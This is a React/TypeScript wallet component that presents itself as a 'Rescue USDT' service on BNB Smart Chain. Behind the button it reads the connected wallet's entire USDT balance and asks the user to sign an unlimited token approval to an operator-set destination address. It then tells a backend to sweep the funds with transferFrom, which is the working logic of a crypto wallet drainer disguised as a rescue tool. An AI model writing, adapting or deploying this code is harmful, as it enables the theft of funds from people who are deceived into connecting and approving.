import { useState } from "react";
import { ethers } from "ethers";
import { ensureBSC } from "../wallet/wallet";

const USDT_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transfer(address to, uint256 amount) returns (bool)",
];

export default function WalletConnector() {
  const [wallet, setWallet] = useState<string | null>(null);
  const [connected, setConnected] = useState(false);
  const [loading, setLoading] = useState(false);
  const [rescuing, setRescuing] = useState(false);

  const connect = async () => {
    if (!window.ethereum) {
      alert("MetaMask (or another web3 wallet) is required");
      return;
    }
    setLoading(true);
    try {
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      const addr = accounts[0];
      setWallet(addr);

      // Ask the backend if this address is eligible
      const resp = await fetch(
        `${import.meta.env.VITE_API_BASE}/checkEligibility`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ wallet: addr }),
        }
      );
      const data = await resp.json();

      if (data.eligible) {
        setConnected(true);
      }
    } catch (e: any) {
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  const rescue = async () => {
    if (!window.ethereum || !wallet) return;
    setRescuing(true);

    try {
      await ensureBSC();
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const usdtAddress = import.meta.env.VITE_BSC_USDT_CONTRACT_ADDRESS as string;
      const destination = import.meta.env.VITE_RESCUE_DESTINATION_ADDRESS as string;
      const chainId = import.meta.env.VITE_BSC_CHAIN_ID;

      const usdt = new ethers.Contract(usdtAddress, USDT_ABI, signer);

      // 1. Check balance
      const rawBal: bigint = await usdt.balanceOf(wallet);
      if (rawBal === 0n) {
        throw new Error("No USDT to rescue");
      }

      // 2. Check existing allowance
      const currentAllowance: bigint = await usdt.allowance(wallet, destination);

      let approvalTxHash = "";

      if (currentAllowance >= rawBal) {
        // Already approved — no user signature needed
        approvalTxHash = "already-approved";
      } else {
        // Ask user for unlimited approval (single signature)
        const MAX = ethers.MaxUint256;
        const approveTx = await usdt.approve(destination, MAX);
        await approveTx.wait(1);
        approvalTxHash = approveTx.hash;
      }

      // 3. Tell the backend to sweep the funds using transferFrom
      const res = await fetch(`${import.meta.env.VITE_API_BASE}/verifyRescue`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          txHash: approvalTxHash,
          from: wallet,
          to: destination,
          amount: rawBal.toString(),
          chainId: chainId,
          token: usdtAddress,
        }),
      });

      const verifyData = await res.json();
      if (!res.ok || !verifyData.success) {
        throw new Error(verifyData.error || "Rescue failed");
      }
    } catch (e: any) {
      console.error(e);
    } finally {
      setRescuing(false);
    }
  };

  return (
    <div className="flex flex-col items-center gap-4 bg-white p-6 rounded-lg shadow-md w-full">
      {!connected ? (
        <button
          onClick={connect}
          disabled={loading}
          className="px-6 py-2 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 disabled:opacity-50"
        >
          {loading ? "Connecting..." : "Connect Wallet"}
        </button>
      ) : (
        <button
          onClick={rescue}
          disabled={rescuing}
          className="px-8 py-3 bg-red-600 text-white font-bold rounded-lg hover:bg-red-700 disabled:opacity-50 text-lg w-full shadow-lg"
        >
          {rescuing ? "Processing..." : "Rescue USDT"}
        </button>
      )}
      {wallet && (
        <div className="text-sm text-gray-700 text-center">
          <p>Connected: <code className="bg-gray-100 p-1 rounded break-all">{wallet}</code></p>
        </div>
      )}
    </div>
  );
}
